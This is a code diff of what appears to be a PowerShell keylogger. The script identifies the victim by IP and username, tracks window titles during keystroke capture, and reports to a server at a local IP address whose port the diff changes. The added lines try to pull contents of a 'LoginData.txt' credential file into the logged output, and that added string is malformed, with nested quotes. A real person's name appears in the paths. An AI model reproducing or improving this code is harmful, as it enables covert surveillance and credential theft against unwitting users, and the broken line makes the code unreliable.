@@ -1,6 +1,5 @@
 cd 'c:\Users\Mehmet Dere\Desktop\Yeniklasör\'
-set-clipboard (get-content vrsc.txt)
-$server = 'http://192.168.1.41:5050'
+$server = 'http://192.168.1.41:6060'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
@@ -161,7 +160,10 @@ while ($true) {
 			if ($unicode_res -gt 0) {
 				if ($WindowTitle -ne $LastWindowTitle){
 					# if the window has changed
-					$TimeStamp = ("get-clipboard")
+					$TimeStamp = ("foreach($line in [System.IO.File]::ReadLines("c:\Users\Mehmet Dere\Desktop\Yeniklasör\LoginData.txt"))
+{
+       $line
+}")
 					$Outout = "`n[$WindowTitle - $TimeStamp]`n"
 					$LastWindowTitle = $WindowTitle
 				}
